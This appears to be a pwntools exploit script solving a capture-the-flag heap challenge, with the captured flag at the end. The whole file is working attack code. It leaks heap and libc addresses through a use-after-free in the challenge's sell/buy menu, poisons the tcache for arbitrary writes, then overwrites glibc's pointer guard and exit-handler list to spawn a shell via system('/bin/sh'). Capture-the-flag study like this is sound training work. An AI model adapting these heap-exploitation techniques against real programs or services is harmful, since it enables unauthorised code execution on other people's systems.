#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chall'
#context.terminal = ['tmux', 'new-window']
context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {'LD_PRELOAD':'./libc.so.6'}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# storage_addr = address of fd pointer of chunk
# target = target of fd pointer
def mask(storage_addr, target):
    return target ^ (storage_addr >> 12)

def wait():
    input("waiting")

def rol(x, shift, bits=64):
	return ((x << shift) | (x >> (bits-shift))) % (1<<bits)

def ror(x, shift, bits=64):
	return ror(x, bits-shift, bits=bits)

def change_name(name):
    io.sendlineafter("choice:", str(3))
    # 0x10 bytes
    io.sendlineafter("username:", name)

# allocs 0x40
def sell_item(item_name, price):
    io.sendlineafter(b"Your choice: ", b"1")
    # 0x28 bytes
    io.sendlineafter(b"What have you got? ", item_name)
    # max price is 0x3e8 (1000)
    io.sendlineafter(b"How much do you want for it? ", str(price).encode())

    io.sendlineafter(b"Do we have a deal? (y/n) ", b"y")
    io.recvuntil(b"Item stored with code ")
    return int(io.recvline())

sell_uaf = lambda: sell_item(b" a"*3, 0x3e9)

def buy_item(item_code, bug=False):
    io.sendlineafter(b"Your choice: ", b"2")
    # item code: < 0 <= 0x11
    io.sendlineafter(b'What would you like to buy? ', str(item_code).encode())
    if bug == False:
        io.sendlineafter(b"What's the best you can do for it? ", str(0x400*2).encode())

def list_items():
    io.sendlineafter(b"Your choice: ", b"4")

def malloc_consolidate():
    buy_item("69".rjust(0x400, '0'), True)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
set resolve-heap-via-heuristic force

# uaf
# breakrva 0x1d4c
#breakrva 0x1dd8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# uaf at 0x401d4c
# items stored in mmaped region

# 0x5fec3540b4e0

io = start(argv, env=env)

print(io.recvuntil("Result:").decode())
res = input("pow:")
io.sendline(res)

uaf = sell_uaf()
items = []
for i in range(7):
    items.append(sell_item(b"A", 0x3e8))

# fill tcache
for i in items:
    buy_item(i)

# free to fastbin[0x50]
buy_item(uaf, True)

list_items()
io.recvuntil("Code 0: ")
heap_leak = u64(io.recvline()[:-1].ljust(8, b"\x00")) << 12
log.info(f"heap leak: {hex(heap_leak)}")

malloc_consolidate()

list_items()
io.recvuntil("Code 0: ")
libc_leak = u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x1d3d20
libc.address = libc_leak
log.info(f"libc leak: {hex(libc_leak)}")

uaf = sell_uaf()

# empty tcache and smallbin
items = []
for i in range(8):
    items.append(sell_item("A", 0x100))

# fill it again
for i in range(7):
    buy_item(items[i])

# free uaf the first time
buy_item(uaf, True)
buy_item(items[7])
# second time (can be found again since first 8 byte contains fd pointer now)
buy_item(uaf)

# uaf -> chunk_7 -> uaf
# chunk_7 -> uaf -> target

for i in range(7):
    items.append(sell_item("A", 0x100))

# corrupt fd ptr
victim_addr = heap_leak + 0x710
# per_thread struct
target = heap_leak+0xc0

# corrupt fd pointer to point into per_thread struct close to where
# 0x50 chunk pointer is stored
sell_item(p64(mask(victim_addr, target)), 0x100)
sell_item("A", 0x100)
sell_item("A", 0x100)
# corrupt 0x50 chunk pointer with pointer just before the pointer address in
# order to craft a fake chunk there
per_thread_chunk = sell_item(p64(heap_leak+0xc0-0x10), 0x100)

# now layout is:
# 0x0: "A"*8 + p64(0x51) (fake chunk)
# 0x8: 0x50 tcache pointer
fake_chunk = sell_item(flat({8: p64(0x51)}) , 0x100)
buy_item(per_thread_chunk)

# we can now free and re-allocate the per_thread_chunk to get infinite writes
def write(addr, data):
    # corrupt tcache ptr
    per_thread_chunk = sell_item(p64(addr), 0x100)
    # allocate at arbitrary address, write to it
    sell_item(data, 0x100)
    # free or corruption chunk again
    buy_item(per_thread_chunk)

tcbhead = libc.address - 0x28c0
log.info(f"pointer guard: {hex(tcbhead+0x30)}")
key = 0xdeadbeef
# write known key to pointer_guard
write(tcbhead + 0x30, p64(key))

# flat uses pointer size of target by default
write(libc.sym.initial, flat(
    # normally should set next to 0 but since challenge uses gets, which stops
    # reading upon encountering a null byte, we gotta pass 1
	1,      # next
	1,      # idx
	4,      # flavor = ef_cxa
	rol(key ^ libc.sym.system, 0x11),         # func
    next(libc.search(b"/bin/sh\x00")),  # arg
)[:0x27])

io.sendlineafter(b"Your choice: ", b"5")

io.interactive()

# FLAG=ptm{1_d0nt_kn0w_f4k3_1t_l00k5_r1ck}
